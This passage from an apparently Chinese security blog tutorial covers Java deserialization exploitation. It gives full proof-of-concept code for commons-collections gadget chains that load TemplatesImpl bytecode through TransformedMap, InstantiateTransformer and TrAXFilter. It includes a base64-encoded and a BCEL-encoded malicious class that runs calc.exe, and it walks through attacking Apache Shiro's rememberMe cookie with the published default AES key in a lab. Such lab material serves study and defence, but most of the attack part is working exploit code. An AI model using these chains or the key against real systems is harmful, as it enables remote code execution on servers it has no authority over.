&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.decodeBase64(<span class="string">&quot;yv66vgAAADQAOgoACQAhCQAiACMIACQKACUAJgoAJwAoCAApCgAnACoHACsHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGExldmlsL0V2aWxUZW1wbGF0ZXNJbXBsOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYHAC4BAApTb3VyY2VGaWxlAQAWRXZpbFRlbXBsYXRlc0ltcGwuamF2YQwAHAAdBwAvDAAwADEBABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAyDAAzADQHADUMADYANwEACGNhbGMuZXhlDAA4ADkBABZldmlsL0V2aWxUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACAAJAAAAAAADAAEACgALAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAKAA4AAAAgAAMAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAEwAUAAIAFQAAAAQAAQAWAAEACgAXAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAMAA4AAAAqAAQAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAGAAZAAIAAAABABoAGwADABUAAAAEAAEAFgABABwAHQACAAwAAABMAAIAAQAAABYqtwABsgACEgO2AAS4AAUSBrYAB1exAAAAAgANAAAAEgAEAAAADwAEABAADAARABUAEgAOAAAADAABAAAAFgAPABAAAAAVAAAABAABAB4AAQAfAAAAAgAg&quot;</span>.getBytes());</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        obj.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述src字节码来自EvilTemplatesImpl.java编译的class，然后将内容base64。</p><p>这里jdk的版本为8u65+commons-collections4.0</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130132739469.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130132739469.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221130132739469"></p><h2 id="TransformedMap调用TemplatesImpl加载字节码"><a href="#TransformedMap调用TemplatesImpl加载字节码" class="headerlink" title="TransformedMap调用TemplatesImpl加载字节码"></a>TransformedMap调用TemplatesImpl加载字节码</h2><blockquote><p>依赖：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">3.1</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;  </span><br></pre></td></tr></table></figure></blockquote><ul><li>CC1是依靠TransformedMap直接执行Runtime实例的exec，那根据以上内容，可以直接执行TemplatesImpl下的newTransformer。</li></ul><p>只需要修改ConstantTransformer的对象为TemplatesImpl。InvokerTransforomer执行的方法为newTransformer，由于newTransformer不需要参数，所以参数列表和参数内容null就行了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(obj, value);</span><br><span class="line">        &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// source: bytecodes/HelloTemplateImpl.java</span></span><br><span class="line">        <span class="type">byte</span>[] code =Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAOgoACQAhCQAiACMIACQKACUAJgoAJwAoCAApCgAnACoHACsHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGExldmlsL0V2aWxUZW1wbGF0ZXNJbXBsOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYHAC4BAApTb3VyY2VGaWxlAQAWRXZpbFRlbXBsYXRlc0ltcGwuamF2YQwAHAAdBwAvDAAwADEBABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAyDAAzADQHADUMADYANwEACGNhbGMuZXhlDAA4ADkBABZldmlsL0V2aWxUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACAAJAAAAAAADAAEACgALAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAKAA4AAAAgAAMAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAEwAUAAIAFQAAAAQAAQAWAAEACgAXAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAMAA4AAAAqAAQAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAGAAZAAIAAAABABoAGwADABUAAAAEAAEAFgABABwAHQACAAwAAABMAAIAAQAAABYqtwABsgACEgO2AAS4AAUSBrYAB1exAAAAAgANAAAAEgAEAAAADwAEABAADAARABUAEgAOAAAADAABAAAAFgAPABAAAAAVAAAABAABAB4AAQAfAAAAAgAg&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">    &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">        <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">        transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;godown&quot;</span>, <span class="string">&quot;buruheshen&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130152023647.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130152023647.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221130152023647"></p><h2 id="Common-collections3"><a href="#Common-collections3" class="headerlink" title="Common-collections3"></a>Common-collections3</h2><p>一般来说都不用InvokerTransformers，因为一个广泛用于java反序列化过滤的工具SerialKiller，它的第一个版本过滤掉了InvokerTransformer，所以有了CC3</p><ul><li>CC3使用<code> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>，而且这个类不是像InvokerTransformer一样调用方法，而是直接在构造函数调用了newTransformer()</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130192845333.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130192845333.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221130192845333"></p><p>但是之前的CC链调用构造函数可以依赖InvokerTransformer调用transform进行任意函数调用，包括构造函数。（getConstructor反射没有transform接口，前面无法连起来)</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130194653361.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130194653361.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221130194653361"></p><p>可以用InstantiateTransformer来调用TrAXFilter构造方法。构造函数的参数就是字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; obj &#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130203928758.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130203928758.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221130203928758"></p><h2 id="BCEL-ClassLoader"><a href="#BCEL-ClassLoader" class="headerlink" title="BCEL ClassLoader"></a>BCEL ClassLoader</h2><p>BCEL包的<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>重写了java内置的<code>ClassLoader#loadClass()</code>方法。BCEL包的ClassLoader会判断类名是否为<code>$$BCEL$$</code>开头，如果是，会对字符串进行解码（算法细节看源码）</p><p>可以通过BCEL提供的Repository将一个class转换成原生字节码（也能直接编译），再用Utility将原生字节码转换成BCEL格式字节码</p><h3 id="BCEL弹计算器"><a href="#BCEL弹计算器" class="headerlink" title="BCEL弹计算器"></a>BCEL弹计算器</h3><p>先写一个恶意类BCELEvil：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELEvil</span> &#123;</span><br><span class="line">            <span class="keyword">static</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后将BCELEvil.java转换成BCEL字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> evil;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELencode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(evil.BCELEvil.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130141306148.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130141306148.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221130141306148"></p><p>验证是否成功执行字节码：（注意ClassLoader.loadClass是负责加载类的，字符串需要用newInstance()实例化）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELdecode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span>+<span class="string">&quot;$l$8b$I$A$A$A$A$A$A$AeP$cbN$c30$Q$i$b7$a1IC$d2B$cb$fb$cd$89$c2$81$5c$b8$Vq$a0$w$X$c2C$U$95$b3k$acb$I$JJ$5d$c4$lq$ee$F$Q$H$3e$80$8fB$acC$81$o$oy$c7$3b$de$99$b1$f3$fe$f1$fa$G$60$H$eb$$lL$b9$98$c6$8c$83Y$83s6$e6m$y$d8Xd$u$ec$aaX$e9$3d$86$7cm$b3$cd$605$92K$c9P$OU$y$8f$fb$b7$j$99$9e$f3NDL$rL$E$8f$da$3cU$a6$l$92$96$beR$3d3$z$efU$U$ec7$9aa$936u$GgWDC_$bf$a5$b9$b89$e2w$99$86$92$Z$dcV$d2O$85$3cP$c6$c3$ff$96m_$f3$7b$ee$c1A$d1$c6$92$87e$ac$90$Pe$8am$f9$m$3d$acb$8d$a1jf$82$88$c7$dd$a0$f9$m$e4$9dVIL$W$7f$e2$Z$s$7e$a7N$3a$d7Rh$86$c9_$ea$ac$lkuK$c9nW$ea$9ff$ba$b6$Z$fe$9b$a1$97X$U$$$Y6j$p$a7$z$9d$aa$b8$5b$l$V$9c$a6$89$90$bd$5e$j$eb$u$d0$ef6_$O$cc$3c$86$aaK$5d$40$c8$I$c7$b6$9e$c1$G$d9$f18$d5BF$e6$e1Q$f5$be$G$e0$a3D$e8$a0$fc$p$3e$cc$cc$80$d2$Lr$95$fc$T$ac$8bGX$87$83$8c$x$92n$8c$i$8c$5b$89$d0x$W$e9$K$3e9xY$O0A$cbF$$$b41$J$SU2$ba$fa$JOO$ad$8b$o$C$A$A&quot;</span>).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130142334254.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130142334254.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221130142334254"></p><h2 id="shiro反序列化"><a href="#shiro反序列化" class="headerlink" title="shiro反序列化"></a>shiro反序列化</h2><p>由于前面几种CC都有一定的限制，比如CC1用到exec需要为Runtime下的方法，而且不同的利用方式对应了不同的利用链。但是TemplatesImpl可以执行任意java代码</p><ul><li>原理：shiro为了让浏览器保存登录状态，将保持登录的信息序列化并加密后保存在Cookie的rememberMe字段，在读取时反序列化。但在shiro 1.2.4版本前加密key固定</li></ul><p>靶机：<a href="https://github.com/phith0n/JavaThings/blob/master/shirodemo">https://github.com/phith0n/JavaThings/blob/master/shirodemo</a></p><p>对java项目进行打包：右侧maven-&gt;生命周期-&gt;clean-&gt;complie-&gt;package 就可以看到有输出包</p><p>配置到tomcat上：下载tomcat后安装（不用配环境变量）-&gt;IDEA里运行-&gt;编辑配置-&gt;应用程序服务器指向tomcat文件-&gt;部署里添加已打包的包-&gt;确定后运行</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221204135854142.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221204135854142.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221204135854142"></p><p>正确的账号密码为 root secret</p><p>在登录时选中<code>Remember me</code>服务器会返回一个set-cookie作为客户端cookie</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221204135939822.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221204135939822.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221204135939822"></p><p>攻击方式：用 <strong>shiro加密cookie的key</strong> 加密payload，放到cookie中进行攻击</p><p>该靶机key的值为：<code>kPH+bIxk5D2deZiIxcaaaA==</code>的base64解码（默认密钥）。加密方式为aes</p><p>漏洞特征为：登录页面响应包有rememberMe&#x3D;deleteMe。Cookie中有rememberM字段</p><p>检测工具：<code>https://github.com/feihong-cs/ShiroExploit</code></p><blockquote><p>shiro无法利用CC1,6。因为shiro的ClassResolvingObjectInputStream重写了resolveClass(查找类的方法)，而resolveClass使用到的forName和原生的Class.forName不一样。导致反序列化流不能包含非java自身的数组，CC1,6都使用了Transformer数组</p></blockquote><p>在上一篇的CC6(<code>https://xz.aliyun.com/t/11861</code>)中，反序列化链为：<code>java.util.HashMap#readObject()</code> 到<code>HashMap#hash()</code>到<code>TiedMapEntry#hashCode()</code>到<code>TiedMapEntry#getValue()</code>到<code>LazyMap.get()</code>(get不到值的时候触发)到<code>transformer()</code>。transformer调用ConstantTransformer和InvokerTransformer进行命令执行</p><p>CC6的POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span 